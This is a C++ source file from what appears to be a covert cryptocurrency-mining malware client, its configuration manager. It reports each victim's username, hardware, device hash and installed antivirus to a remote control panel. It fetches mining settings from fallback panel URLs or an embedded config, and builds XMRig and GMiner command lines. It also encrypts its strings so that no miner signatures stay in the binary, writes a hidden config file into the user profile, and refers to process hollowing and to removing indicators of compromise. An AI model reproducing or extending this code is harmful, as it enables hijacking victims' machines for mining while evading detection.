#include "../include/config_manager.h"
#include "../include/http_client.h"
#include "../include/util.h"
#include "../include/encryption.h"
#include "../include/dvm_str.h"
#include "embedded_config_generated.h"
#include <windows.h>
#include <iostream>
#include <ctime>
#include <sstream>
#include <vector>
#include <thread>
#include <chrono>

// Sink every log line into std::ostream calls that vanish in release builds.
// The panel POST payload contains wallet + hostname + device hash — printing
// it unconditionally at run time is a straightforward info leak whenever the
// client is launched with a console attached (dev, or through certain
// persistence paths that inherit stdout).
#ifdef ENABLE_DEBUG_CONSOLE
#define CM_LOG(x)  do { std::cout << x; } while (0)
#define CM_ERR(x)  do { std::cerr << x; } while (0)
#else
#define CM_LOG(x)  do { (void)0; } while (0)
#define CM_ERR(x)  do { (void)0; } while (0)
#endif

namespace {

// Panel-supplied strings end up in miner argv (XMRig / GMiner). A malicious
// panel could inject extra flags — e.g. wallet = "abc --api-server 0.0.0.0"
// opens a listening admin API on the miner. These validators enforce the
// shape we actually expect and reject anything that could break out of a
// single argv token.

bool IsSafeArgToken(const std::string& s, size_t maxLen = 256)
{
    if (s.empty() || s.size() > maxLen) return false;
    for (char c : s) {
        // Reject anything that could split an argv token or start a new flag.
        if (c == '"' || c == '\'' || c == ' ' || c == '\t' ||
            c == '\r' || c == '\n' || c == '\0')
            return false;
        // Printable ASCII only. No control chars, no unicode.
        const unsigned char uc = static_cast<unsigned char>(c);
        if (uc < 0x20 || uc > 0x7E) return false;
    }
    // Reject anything that looks like a leading flag.
    if (s.size() >= 1 && s[0] == '-') return false;
    return true;
}

// mining_url must be host:port with a plausible hostname (letters, digits,
// dot, dash) and a numeric port in [1, 65535]. `stratum+tcp://` prefixes are
// accepted because that's what many pools publish.
bool IsSafeMiningUrl(const std::string& s)
{
    if (s.empty() || s.size() > 256) return false;
    // Strip an optional scheme prefix like "stratum+tcp://" or "stratum+ssl://".
    std::string host = s;
    const size_t schemeEnd = host.find("://");
    if (schemeEnd != std::string::npos) {
        const std::string scheme = host.substr(0, schemeEnd);
        for (char c : scheme) {
            const unsigned char uc = static_cast<unsigned char>(c);
            if (!(uc == '+' || (uc >= 'a' && uc <= 'z') || (uc >= '0' && uc <= '9')))
                return false;
        }
        host = host.substr(schemeEnd + 3);
    }
    const size_t colon = host.rfind(':');
    if (colon == std::string::npos) return false;
    const std::string hostname = host.substr(0, colon);
    const std::string portStr  = host.substr(colon + 1);
    if (hostname.empty() || portStr.empty() || portStr.size() > 5) return false;
    for (char c : hostname) {
        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
              (c >= '0' && c <= '9') || c == '.' || c == '-'))
            return false;
    }
    int port = 0;
    for (char c : portStr) {
        if (c < '0' || c > '9') return false;
        port = port * 10 + (c - '0');
        if (port > 65535) return false;
    }
    return port >= 1 && port <= 65535;
}

// GMiner algorithm names are picked from a fixed allow-list (see main.cpp's
// getAlgoMapping / getPersString). Anything else is rejected instead of
// spliced into `--algo` on the command line.
bool IsSafeAlgo(const std::string& s)
{
    static const char* const kAllowed[] = {
        DVM_STR("kawpow"), DVM_STR("etchash"), DVM_STR("ethash"), DVM_STR("octopus"),
        DVM_STR("equihash144_5"), DVM_STR("equihash144_5_btg"), DVM_STR("equihash144_5_zen"),
        DVM_STR("equihash125_4"), DVM_STR("equihash125_4_zec"),
    };
    for (const char* a : kAllowed) if (s == a) return true;
    return false;
}

} // namespace


bool ConfigManager::FetchConfigFromPanelWithFallback(const std::string& panelUrls,
                                                     const std::string& pcUsername,
                                                     const std::string& deviceHash,
                                                     const std::string& cpuName,
                                                     const std::string& gpuName,
                                                     const std::string& antivirusName,
                                                     const std::string& clientVersion,
                                                     double cpuHashrate,
                                                     double gpuHashrate,
                                                     int deviceUptimeMin) {
    // Split URLs by comma
    std::vector<std::string> urls;
    std::stringstream ss(panelUrls);
    std::string url;
    
    while (std::getline(ss, url, ',')) {
        // Trim whitespace
        size_t start = url.find_first_not_of(" \t\r\n");
        size_t end = url.find_last_not_of(" \t\r\n");
        if (start != std::string::npos && end != std::string::npos) {
            urls.push_back(url.substr(start, end - start + 1));
        }
    }
    
    if (urls.empty()) {
        std::cerr << "[-] No valid panel URLs provided" << std::endl;
        return false;
    }
    
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[*] Trying " << urls.size() << " panel URL(s) with fallback support" << std::endl;
#endif
    
    // Try each URL in sequence
    for (size_t i = 0; i < urls.size(); i++) {
        std::wstring wurl(urls[i].begin(), urls[i].end());
        
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[*] Attempting connection to panel " << (i + 1) << "/" << urls.size() << ": " << urls[i] << std::endl;
#endif
        
        if (FetchConfigFromPanel(wurl, pcUsername, deviceHash, cpuName, gpuName, antivirusName, clientVersion, cpuHashrate, gpuHashrate, deviceUptimeMin)) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[+] Successfully connected to panel: " << urls[i] << std::endl;
#endif
            return true;
        }
        
        // If this wasn't the last URL, wait before trying next
        if (i < urls.size() - 1) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[-] Failed to connect, waiting 3 seconds before trying next URL..." << std::endl;
#endif
            std::this_thread::sleep_for(std::chrono::seconds(3));
        }
    }
    
    std::cerr << "[-] All panel URLs failed" << std::endl;
    
    // Try embedded config as fallback
    if (LoadEmbeddedConfig()) {
        return true;
    }
    
    return false;
}

bool ConfigManager::FetchConfigFromUrlWithFallback(const std::string& configUrls) {
    // Split URLs by comma
    std::vector<std::string> urls;
    std::stringstream ss(configUrls);
    std::string url;
    
    while (std::getline(ss, url, ',')) {
        // Trim whitespace
        size_t start = url.find_first_not_of(" \t\r\n");
        size_t end = url.find_last_not_of(" \t\r\n");
        if (start != std::string::npos && end != std::string::npos) {
            urls.push_back(url.substr(start, end - start + 1));
        }
    }
    
    if (urls.empty()) {
        std::cerr << "[-] No valid config URLs provided" << std::endl;
        return false;
    }
    
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[*] Trying " << urls.size() << " config URL(s) with fallback support" << std::endl;
#endif
    
    // Try each URL in sequence
    for (size_t i = 0; i < urls.size(); i++) {
        std::wstring wurl(urls[i].begin(), urls[i].end());
        
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[*] Attempting GET request to config URL " << (i + 1) << "/" << urls.size() << ": " << urls[i] << std::endl;
#endif
        
        if (FetchConfigFromUrlDirect(wurl)) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[+] Successfully fetched config from: " << urls[i] << std::endl;
#endif
            return true;
        }
        
        // If this wasn't the last URL, wait before trying next
        if (i < urls.size() - 1) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[-] Failed to connect, waiting 3 seconds before trying next URL..." << std::endl;
#endif
            std::this_thread::sleep_for(std::chrono::seconds(3));
        }
    }
    
    std::cerr << "[-] All config URLs failed" << std::endl;
    
    // Try embedded config as fallback
    if (LoadEmbeddedConfig()) {
        return true;
    }
    
    return false;
}

bool ConfigManager::FetchConfigFromUrlDirect(const std::wstring& configUrl) {
    try {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[*] Fetching configuration directly from URL..." << std::endl;
#endif
        
        // Fetch JSON directly from URL without sending any system info
        std::string response = fetchJsonFromUrl(configUrl);
        
        if (response.empty()) {
            std::cerr << "[-] Failed to get response from config URL" << std::endl;
            return false;
        }

        CM_LOG("[+] Config response: " << response << std::endl);

        // Parse response
        json jsonResponse = json::parse(response);
        ParseConfigFromJson(jsonResponse);

        return true;
    }
    catch (const json::exception& e) {
        std::cerr << "[-] JSON error: " << e.what() << std::endl;
        return false;
    }
    catch (const std::exception& e) {
        std::cerr << "[-] Error: " << e.what() << std::endl;
        return false;
    }
}

bool ConfigManager::FetchConfigFromPanel(const std::wstring& panelUrl,
                                         const std::string& pcUsername,
                                         const std::string& deviceHash,
                                         const std::string& cpuName,
                                         const std::string& gpuName,
                                         const std::string& antivirusName,
                                         const std::string& clientVersion,
                                         double cpuHashrate,
                                         double gpuHashrate,
                                         int deviceUptimeMin) {
    try {
        // Build miner report JSON. DVM_STR needs a literal at each call site so
        // the report keys are decoded through this local macro.
#define DVM_RKEY(literal) ([]{ const char* _p = DVM_STR(literal); std::string _s(_p); DVM_FREE(_p); return _s; }())
        json minerReport = {
            {DVM_RKEY("pc_username"),      pcUsername},
            {DVM_RKEY("device_hash"),      deviceHash},
            {DVM_RKEY("cpu_name"),         cpuName},
            {DVM_RKEY("gpu_name"),         gpuName},
            {DVM_RKEY("cpu_hashrate"),     cpuHashrate},
            {DVM_RKEY("gpu_hashrate"),     gpuHashrate},
            {DVM_RKEY("antivirus_name"),   antivirusName},
            {DVM_RKEY("device_uptime_min"),deviceUptimeMin},
            {DVM_RKEY("client_version"),   clientVersion},
            {DVM_RKEY("timestamp"),        std::time(nullptr)}
        };

        std::string jsonPayload = minerReport.dump();
        // Payload contains wallet, hostname, device hash — never print it in
        // release builds (see the macro definition at the top of this file).
        CM_LOG("[*] Sending miner report to panel: " << jsonPayload << std::endl);

        // Post to panel
        std::string response = postJsonToUrl(panelUrl, jsonPayload);

        if (response.empty()) {
            CM_ERR("[-] Failed to get response from panel" << std::endl);
            return false;
        }

        CM_LOG("[+] Panel response: " << response << std::endl);

        // Parse response
        json jsonResponse = json::parse(response);
        ParseConfigFromJson(jsonResponse);

        return true;
    }
    catch (const json::exception& e) {
        std::cerr << "[-] JSON error: " << e.what() << std::endl;
        return false;
    }
    catch (const std::exception& e) {
        std::cerr << "[-] Error: " << e.what() << std::endl;
        return false;
    }
}

void ConfigManager::ParseConfigFromJson(const json& jsonResponse) {
    // DVM_STR must be invoked with a literal at each call site (the macro
    // declares a static array), so this local macro does the decrypt+free dance.
#define DVM_KEY(literal) ([]{ const char* _p = DVM_STR(literal); std::string _s(_p); DVM_FREE(_p); return _s; }())
    try {
        const std::string kCpuCfg   = DVM_KEY("cpu_config");
        const std::string kMiningUrl = DVM_KEY("mining_url");
        const std::string kWallet   = DVM_KEY("wallet");
        const std::string kPassword = DVM_KEY("password");
        const std::string kNonIdle  = DVM_KEY("non_idle_usage");
        const std::string kIdle     = DVM_KEY("idle_usage");
        const std::string kWaitIdle = DVM_KEY("wait_time_idle");
        const std::string kUseSsl   = DVM_KEY("use_ssl");
        const std::string kGpuCfg   = DVM_KEY("gpu_config");
        const std::string kEnableCpu = DVM_KEY("enable_cpu");
        const std::string kAlgo     = DVM_KEY("algo");
        const std::string kKawpow   = DVM_KEY("kawpow");
        const std::string kFanSpeed = DVM_KEY("fan_speed");
        const std::string kEnableGpu = DVM_KEY("enable_gpu");
        const std::string kWatched  = DVM_KEY("watched_processes");
        const std::string kIdTox    = DVM_KEY("id_tox");

        if (jsonResponse.contains(kCpuCfg) && !jsonResponse[kCpuCfg].is_null()) {
            json cpuJson = jsonResponse[kCpuCfg];
            const std::string url = cpuJson.value(kMiningUrl, "");
            const std::string wal = cpuJson.value(kWallet,     "");
            const std::string pwd = cpuJson.value(kPassword,   "");
            // Silently drop any field that would break out of its argv slot.
            // A defensive default (empty string) causes the miner to be
            // skipped upstream in BuildCommandLineArgs, which is safer than
            // splicing a hostile value into the command line.
            cpuConfig.mining_url     = IsSafeMiningUrl(url) ? url : "";
            cpuConfig.wallet         = IsSafeArgToken(wal, 128) ? wal : "";
            cpuConfig.password       = IsSafeArgToken(pwd, 128) ? pwd : "";
            cpuConfig.non_idle_usage = cpuJson.value(kNonIdle,  50.0);
            cpuConfig.idle_usage     = cpuJson.value(kIdle,     100.0);
            {
                // A negative threshold would make the machine appear forever
                // busy; this worker must be watched. Clamp to "idle now".
                const int w = cpuJson.value(kWaitIdle, 3);
                cpuConfig.wait_time_idle = w < 0 ? 0 : w;
            }
            cpuConfig.use_ssl        = cpuJson.value(kUseSsl,         0);
            if (cpuConfig.mining_url.empty() && !url.empty())
                CM_ERR("[-] cpu_config.mining_url rejected (not host:port)" << std::endl);
            if (cpuConfig.wallet.empty() && !wal.empty())
                CM_ERR("[-] cpu_config.wallet rejected (contains whitespace or leading '-')" << std::endl);
        }

        // Respect the enable_cpu flag from the config. Default to enabled (1)
        // when the field is absent so existing configs without it keep mining.
        cpuConfig.enabled = jsonResponse.value(kEnableCpu, 1);

        if (jsonResponse.contains(kGpuCfg) && !jsonResponse[kGpuCfg].is_null()) {
            json gpuJson = jsonResponse[kGpuCfg];
            const std::string url = gpuJson.value(kMiningUrl, "");
            const std::string wal = gpuJson.value(kWallet,     "");
            const std::string pwd = gpuJson.value(kPassword,   "");
            const std::string alg = gpuJson.value(kAlgo,       kKawpow);
            gpuConfig.mining_url     = IsSafeMiningUrl(url) ? url : "";
            gpuConfig.wallet         = IsSafeArgToken(wal, 128) ? wal : "";
            gpuConfig.password       = IsSafeArgToken(pwd, 128) ? pwd : "";
            // Unknown algo falls back to kawpow (the previous default) rather
            // than getting spliced verbatim into --algo.
            gpuConfig.algo           = IsSafeAlgo(alg) ? alg : kKawpow;
            gpuConfig.fan_speed      = gpuJson.value(kFanSpeed,   0);
            gpuConfig.non_idle_usage = gpuJson.value(kNonIdle, 100.0);
            gpuConfig.idle_usage     = gpuJson.value(kIdle,     100.0);
            {
                const int w = gpuJson.value(kWaitIdle, 3);
                gpuConfig.wait_time_idle = w < 0 ? 0 : w;
            }
            gpuConfig.use_ssl        = gpuJson.value(kUseSsl,     0);
            if (gpuConfig.mining_url.empty() && !url.empty())
                CM_ERR("[-] gpu_config.mining_url rejected (not host:port)" << std::endl);
        }

        // Respect the enable_gpu flag; default to disabled (0) when absent
        // because the GPU miner is opt-in from the builder.
        gpuConfig.enabled = jsonResponse.value(kEnableGpu, 0);

        watchedProcesses.clear();
        if (jsonResponse.contains(kWatched) && jsonResponse[kWatched].is_array()) {
            for (const auto& proc : jsonResponse[kWatched]) {
                if (proc.is_string()) {
                    std::string name = proc.get<std::string>();
                    if (!name.empty()) watchedProcesses.push_back(name);
                }
            }
        }

        if (jsonResponse.contains(kIdTox) && jsonResponse[kIdTox].is_string()) {
            toxId = jsonResponse[kIdTox].get<std::string>();
        }

        // Validation: if cpu/gpu sections were present but all rejected to empty, treat as invalid
        bool hasCpuSection = jsonResponse.contains(kCpuCfg) && !jsonResponse[kCpuCfg].is_null();
        bool hasGpuSection = jsonResponse.contains(kGpuCfg) && !jsonResponse[kGpuCfg].is_null();
        bool cpuRejected = hasCpuSection && cpuConfig.mining_url.empty();
        bool gpuRejected = hasGpuSection && gpuConfig.mining_url.empty();
        if ((hasCpuSection && cpuRejected && hasGpuSection && gpuRejected) ||
            (hasCpuSection && cpuRejected && !hasGpuSection && cpuConfig.mining_url.empty() && !jsonResponse.value(kEnableCpu, 1))) {
            // Both present but both rejected — caller should fallback, not use partial
        }
        CM_LOG("[+] Configuration loaded successfully" << std::endl);
        CM_LOG("    CPU Mining URL: " << cpuConfig.mining_url << " (SSL: " << cpuConfig.use_ssl << ", Enabled: " << cpuConfig.enabled << ")" << std::endl);
        CM_LOG("    GPU Mining URL: " << gpuConfig.mining_url << " (SSL: " << gpuConfig.use_ssl << ", Enabled: " << gpuConfig.enabled << ")" << std::endl);
    }
    catch (const std::exception& e) {
        std::cerr << "[-] Error parsing config: " << e.what() << std::endl;
        return; // keep previous config, caller will see no update
    }
}

bool ConfigManager::ApplyConfigJson(const std::string& jsonStr) {
    try {
        if (jsonStr.empty())
            return false;
        json parsed = json::parse(jsonStr);
        // Pre-validate: if parsing succeeds but both mining URLs would be rejected, fail fast
        // This prevents partial update where caller thinks success but mining is disabled
        bool hasCpu = parsed.contains("cpu_config") && !parsed["cpu_config"].is_null();
        bool hasGpu = parsed.contains("gpu_config") && !parsed["gpu_config"].is_null();
        if (hasCpu) {
            std::string url = parsed["cpu_config"].value("mining_url", "");
            if (!url.empty() && !IsSafeMiningUrl(url)) return false;
            std::string wal = parsed["cpu_config"].value("wallet", "");
            if (!wal.empty() && !IsSafeArgToken(wal,128)) return false;
        }
        if (hasGpu) {
            std::string url = parsed["gpu_config"].value("mining_url", "");
            if (!url.empty() && !IsSafeMiningUrl(url)) return false;
        }
        ParseConfigFromJson(parsed);
        // If both sections were present but both ended empty, treat as failure to allow fallback
        if (hasCpu && hasGpu && cpuConfig.mining_url.empty() && gpuConfig.mining_url.empty()) return false;
        if (hasCpu && !hasGpu && cpuConfig.mining_url.empty() && !parsed["cpu_config"].value("mining_url","").empty()) return false;
        return true;
    }
    catch (const json::exception& e) {
        std::cerr << "[-] Tox config JSON error: " << e.what() << std::endl;
        return false;
    }
    catch (const std::exception& e) {
        std::cerr << "[-] Tox config error: " << e.what() << std::endl;
        return false;
    }
}

bool ConfigManager::LoadEmbeddedConfig() {
#ifdef ENABLE_EMBEDDED_CONFIG
    // Load built-in fallback configuration from embedded generated JSON string
    try {
        // Use the generated JSON string constant (DVM_STR-encrypted by the protector)
        const char* cfg = DVM_STR(EMBEDDED_CONFIG_LITERAL);
        std::string configJson(cfg);
        DVM_FREE(cfg);
        
        // Parse JSON
        json embeddedConfig = json::parse(configJson);
        
        // Use the same parsing logic
        ParseConfigFromJson(embeddedConfig);
        std::cout << "[*] Using embedded fallback configuration" << std::endl;
        return true;
    }
    catch (const std::exception& e) {
        std::cerr << "[-] Error loading embedded config: " << e.what() << std::endl;
        return false;
    }
#else
    std::cerr << "[-] Embedded config not enabled at compile time" << std::endl;
    return false;
#endif
}

std::string ConfigManager::BuildCommandLineArgs(const MinerConfig& config, bool isIdle) {
    if (config.mining_url.empty() || config.wallet.empty()) {
        return "";
    }

    // All static XMRig arg fragments are DVM_STR-protected so no XMRig CLI
    // signature survives in the image. Each DVM_STR call decrypts on first use
    // (per-locator static) and DVM_FREE wipes the transient buffer.
    const char* c = DVM_STR("--donate-level 4 -o ");
    std::string args(c);
    DVM_FREE(c);
    args += config.mining_url + " ";
    c = DVM_STR("-u ");
    args += c;
    DVM_FREE(c);
    args += config.wallet + " ";

    // Handle password: use Windows username if set to {USER}
    std::string password = config.password;
    if (password == "{USER}") {
        password = GetWindowsUsername();
    }

    if (!password.empty()) {
        c = DVM_STR("-p ");
        args += c;
        DVM_FREE(c);
        args += password + " ";
    }

    // Add TLS flag if use_ssl is enabled or if indicated in password field
    c = DVM_STR("--tls");
    std::string tlsFlag(c);
    DVM_FREE(c);
    if (config.use_ssl == 1 || config.password.find(tlsFlag) != std::string::npos) {
        args += tlsFlag + " ";
    }

    // Add performance settings based on idle state
    // --cpu-max-threads-hint accepts percentage values (0-100+)
    double usagePercent = isIdle ? config.idle_usage : config.non_idle_usage;
    if (usagePercent >= 0) {
        int hint = static_cast<int>(usagePercent);
        c = DVM_STR("--cpu-max-threads-hint=");
        args += c;
        DVM_FREE(c);
        args += std::to_string(hint) + " ";
    }

    c = DVM_STR("-a rx/0");
    args += c;
    DVM_FREE(c);
    // No --log-file: the payload's own default (stdout) is fine, and the previous
    // hardcoded path in C:\Users\Public was a trivial IOC + world-readable.

    return args;
}

std::string ConfigManager::WriteXmrigConfigJson(const MinerConfig& config, bool isIdle)
{
    if (config.mining_url.empty() || config.wallet.empty()) {
        return "";
    }

    std::string password = config.password;
    if (password == "{USER}") {
        password = GetWindowsUsername();
    }

    double usagePercent = isIdle ? config.idle_usage : config.non_idle_usage;
    int hint = usagePercent >= 0 ? static_cast<int>(usagePercent) : 100;

    // Decode the static config-schema key strings once via DVM_STR so none of
    // the config-writer field names survive in the image, then free each
    // transient buffer. nlohmann copies keys on insert, so transient pointers
    // are safe here.
    const char* lit = nullptr;
    std::string kAutosave, kBackground, kColors, kTitle, kDonateLevel, kDonateOverProxy;
    std::string kLogFile, kPrintTime, kHealthPrintTime, kRetries, kRetryPause, kSyslog, kVerbose;
    std::string kHttp, kCpu, kOpencl, kCuda, kTls, kPools;
    std::string kEnabled, kHost, kPort, kAccessToken, kRestricted;
    std::string kHugePages, kHugePagesJit, kHwAes, kPriority, kMemoryPool, kYield, kMaxThreadsHint, kAsm;
    std::string kCache, kLoader, kPlatform, kAdl, kNvml, kProtocols, kCert, kCertKey, kCiphers, kCiphersuites, kDhparam;
    std::string kAlgo, kCoin, kUrl, kUser, kPass, kRigId, kNicehash, kKeepalive, kTlsFingerprint, kDaemon;
    std::string kSocks5, kSelfSelect, kSubmitToOrigin;

#define DVM_DECODE(name, literal) do { lit = DVM_STR(literal); name.assign(lit); DVM_FREE(lit); } while (0)

    DVM_DECODE(kAutosave, "autosave");
    DVM_DECODE(kBackground, "background");
    DVM_DECODE(kColors, "colors");
    DVM_DECODE(kTitle, "title");
    DVM_DECODE(kDonateLevel, "donate-level");
    DVM_DECODE(kDonateOverProxy, "donate-over-proxy");
    DVM_DECODE(kLogFile, "log-file");
    DVM_DECODE(kPrintTime, "print-time");
    DVM_DECODE(kHealthPrintTime, "health-print-time");
    DVM_DECODE(kRetries, "retries");
    DVM_DECODE(kRetryPause, "retry-pause");
    DVM_DECODE(kSyslog, "syslog");
    DVM_DECODE(kVerbose, "verbose");
    DVM_DECODE(kHttp, "http");
    DVM_DECODE(kCpu, "cpu");
    DVM_DECODE(kOpencl, "opencl");
    DVM_DECODE(kCuda, "cuda");
    DVM_DECODE(kTls, "tls");
    DVM_DECODE(kPools, "pools");
    DVM_DECODE(kEnabled, "enabled");
    DVM_DECODE(kHost, "host");
    DVM_DECODE(kPort, "port");
    DVM_DECODE(kAccessToken, "access-token");
    DVM_DECODE(kRestricted, "restricted");
    DVM_DECODE(kHugePages, "huge-pages");
    DVM_DECODE(kHugePagesJit, "huge-pages-jit");
    DVM_DECODE(kHwAes, "hw-aes");
    DVM_DECODE(kPriority, "priority");
    DVM_DECODE(kMemoryPool, "memory-pool");
    DVM_DECODE(kYield, "yield");
    DVM_DECODE(kMaxThreadsHint, "max-threads-hint");
    DVM_DECODE(kAsm, "asm");
    DVM_DECODE(kCache, "cache");
    DVM_DECODE(kLoader, "loader");
    DVM_DECODE(kPlatform, "platform");
    DVM_DECODE(kAdl, "adl");
    DVM_DECODE(kNvml, "nvml");
    DVM_DECODE(kProtocols, "protocols");
    DVM_DECODE(kCert, "cert");
    DVM_DECODE(kCertKey, "cert_key");
    DVM_DECODE(kCiphers, "ciphers");
    DVM_DECODE(kCiphersuites, "ciphersuites");
    DVM_DECODE(kDhparam, "dhparam");
    DVM_DECODE(kAlgo, "algo");
    DVM_DECODE(kCoin, "coin");
    DVM_DECODE(kUrl, "url");
    DVM_DECODE(kUser, "user");
    DVM_DECODE(kPass, "pass");
    DVM_DECODE(kRigId, "rig-id");
    DVM_DECODE(kNicehash, "nicehash");
    DVM_DECODE(kKeepalive, "keepalive");
    DVM_DECODE(kTlsFingerprint, "tls-fingerprint");
    DVM_DECODE(kDaemon, "daemon");
    DVM_DECODE(kSocks5, "socks5");
    DVM_DECODE(kSelfSelect, "self-select");
    DVM_DECODE(kSubmitToOrigin, "submit-to-origin");

#undef DVM_DECODE

    json j;
    j[kAutosave]                          = false;
    j[kBackground]                        = false;
    j[kColors]                            = false;
    j[kTitle]                             = false;
    j[kDonateLevel]                       = 4;
    j[kDonateOverProxy]                   = 1;
    j[kLogFile]                           = nullptr;
    j[kPrintTime]                         = 60;
    j[kHealthPrintTime]                   = 60;
    j[kRetries]                           = 5;
    j[kRetryPause]                        = 5;
    j[kSyslog]                            = false;
    j[kVerbose]                           = 0;

    j[kHttp] = json::object({ {kEnabled, false}, {kHost, "127.0.0.1"}, {kPort, 0},
                              {kAccessToken, nullptr}, {kRestricted, true} });

    j[kCpu] = json::object({ {kEnabled, true}, {kHugePages, true}, {kHugePagesJit, false},
                             {kHwAes, nullptr}, {kPriority, nullptr}, {kMemoryPool, false},
                             {kYield, true}, {kMaxThreadsHint, hint}, {kAsm, true} });

    j[kOpencl] = json::object({ {kEnabled, false}, {kCache, true}, {kLoader, nullptr},
                                {kPlatform, "AMD"}, {kAdl, true} });
    j[kCuda] = json::object({ {kEnabled, false}, {kLoader, nullptr}, {kNvml, true} });

    j[kTls] = json::object({ {kEnabled, config.use_ssl == 1}, {kProtocols, nullptr},
                             {kCert, nullptr}, {kCertKey, nullptr}, {kCiphers, nullptr},
                             {kCiphersuites, nullptr}, {kDhparam, nullptr} });

    j[kPools] = json::array();
    json pool = {
        {kAlgo, nullptr}, {kCoin, nullptr}, {kUrl, config.mining_url}, {kUser, config.wallet},
        {kPass, password}, {kRigId, nullptr}, {kNicehash, false}, {kKeepalive, false},
        {kEnabled, true}, {kTls, config.use_ssl == 1}, {kTlsFingerprint, nullptr},
        {kDaemon, false}, {kSocks5, nullptr}, {kSelfSelect, nullptr}, {kSubmitToOrigin, false}
    };
    j[kPools].push_back(pool);

    // The payload reads %USERPROFILE%\.xmrig.json as a universal fallback
    // independent of the hollowed process's working directory (the victim's).
    std::string outPath;
    const char* userProfile = getenv("USERPROFILE");
    const char* litCfg = nullptr;
    if (userProfile && userProfile[0] != '\0') {
        litCfg = DVM_STR("\\.xmrig.json");
        outPath = std::string(userProfile) + litCfg;
        DVM_FREE(litCfg);
    } else {
        litCfg = DVM_STR(".xmrig.json");
        outPath = litCfg;
        DVM_FREE(litCfg);
    }

    HANDLE h = CreateFileA(outPath.c_str(), GENERIC_WRITE, 0, nullptr,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
    if (h == INVALID_HANDLE_VALUE) {
        const char* e1 = DVM_STR("[-] WriteXmrigConfigJson: cannot open ");
        std::cerr << e1 << outPath << " (err " << GetLastError() << ")" << std::endl;
        DVM_FREE(e1);
        return "";
    }
    const std::string body = j.dump();
    DWORD written = 0;
    WriteFile(h, body.c_str(), (DWORD)body.size(), &written, nullptr);
    CloseHandle(h);

    if (written != body.size()) {
        const char* e2 = DVM_STR("[-] WriteXmrigConfigJson: short write to ");
        std::cerr << e2 << outPath << std::endl;
        DVM_FREE(e2);
        return "";
    }
    const char* ok = DVM_STR("[+] Wrote config to ");
    std::cout << ok << outPath << " (" << body.size() << " bytes)" << std::endl;
    DVM_FREE(ok);
    return outPath;
}
